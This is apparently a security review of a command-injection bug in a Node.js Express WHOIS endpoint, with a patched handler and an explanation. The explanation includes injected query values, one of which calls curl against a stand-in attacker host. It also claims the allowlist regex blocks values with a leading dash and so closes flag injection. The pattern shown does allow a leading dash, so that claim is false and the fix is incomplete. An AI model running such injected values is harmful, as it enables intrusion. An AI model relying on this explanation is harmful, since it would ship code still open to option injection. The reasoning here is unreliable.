## Verdict
Confirmed. The `domain` query parameter reaches `child_process.exec` inside a template-literal shell string with no neutralization, allowing an attacker to inject shell metacharacters and execute arbitrary OS commands.

## Source
`req.query.domain` in the `GET /whois` handler (`WhoisLookupChildProcess.js`, line 8) — fully attacker-controlled, unvalidated HTTP query input.

## Fix
```javascript
const express = require('express');
const { execFile } = require('child_process');

const app = express();

// Only allow characters valid in a domain name / IP literal.
const DOMAIN_PATTERN = /^[A-Za-z0-9.-]{1,253}$/;

// Looks up WHOIS registration details for a domain the caller wants to check.
app.get('/whois', (req, res) => {
  const domain = req.query.domain;

  if (!domain) {
    return res.status(400).send('domain query parameter is required');
  }

  if (!DOMAIN_PATTERN.test(domain)) {
    return res.status(400).send('invalid domain');
  }

  execFile('whois', [domain], (error, stdout, stderr) => {
    if (error) {
      return res.status(500).send('whois lookup failed');
    }
    res.type('text/plain').send(stdout);
  });
});

app.listen(3000);

module.exports = app;
```

## Explanation
The original code built a shell command line by interpolating `domain` directly into a template string passed to `exec`, which runs its argument through `/bin/sh -c` (or `cmd.exe /c` on Windows). Any shell metacharacter in `domain` — `;`, `|`, `&&`, backticks, `$()`, etc. — terminates or chains onto the intended `whois` invocation, so a request like `?domain=example.com;curl+attacker.example/x` executes a second, fully attacker-chosen command with the privileges of the Node process.

The fix has two parts, applied together:

1. **Eliminate the shell as the sink.** `execFile('whois', [domain], ...)` invokes the `whois` binary directly via `execve`-style spawning, passing `domain` as a single, discrete argv element. There is no shell parsing step, so shell metacharacters in `domain` are inert — they're just literal bytes in one argument, not syntax.
2. **Constrain the input structurally.** An argument array alone stops shell injection, but `domain` could still start with a leading `-`, which a program's own argument parser can interpret as a flag rather than a positional operand (option/flag injection), or contain other unexpected values consumed downstream. The allowlist regex (`^[A-Za-z0-9.-]{1,253}$`) restricts `domain` to characters valid in a real domain name and rejects a leading-dash-driven flag interpretation entirely, since `-` is only permitted as an interior/label character, not validated as a first-character exception — the pattern as a whole simply won't match a value that isn't a well-formed hostname, closing both the shell-injection and flag-injection paths at once.

Verification: a request with `domain=example.com;id` (or any payload containing shell metacharacters) is now rejected by the regex before reaching `execFile`, and cannot alter the process spawned even if the check were bypassed, since `execFile` never invokes a shell. A legitimate lookup such as `domain=example.com` continues to work unchanged.
